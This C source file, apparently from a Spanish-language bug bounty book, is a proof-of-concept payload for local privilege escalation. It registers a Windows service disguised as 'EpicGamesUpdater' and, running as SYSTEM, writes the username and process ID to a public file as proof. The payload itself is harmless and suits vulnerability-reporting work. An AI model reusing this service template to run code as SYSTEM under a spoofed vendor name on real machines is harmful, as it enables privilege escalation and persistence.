// Extraído de: LibroBugBounty/cap-17-poc-impacto.md
// payload_real_service.c — Payload que se registra como servicio Windows
#include <windows.h>
#include <stdio.h>

SERVICE_STATUS_HANDLE hServiceStatus;
SERVICE_STATUS serviceStatus;

void WINAPI ServiceHandler(DWORD control) {
    if (control == SERVICE_CONTROL_STOP) {
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hServiceStatus, &serviceStatus);
    }
}

void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    hServiceStatus = RegisterServiceCtrlHandlerA(
        "EpicGamesUpdater", ServiceHandler
    );

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(hServiceStatus, &serviceStatus);

    // === PAYLOAD: ejecuta como SYSTEM ===
    FILE* f = fopen("C:\\Users\\Public\\epic_lpe_proof.txt", "w");
    if (f) {
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);
        fprintf(f, "Username: %s\nPID: %d\n", username, GetCurrentProcessId());
        fclose(f);
    }
    // === FIN PAYLOAD ===

    // Mantener el servicio "corriendo" 10 segundos
    Sleep(10000);
    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hServiceStatus, &serviceStatus);
}

int main() {
    SERVICE_TABLE_ENTRYA table[] = {
        {"EpicGamesUpdater", ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcherA(table);
    return 0;
}
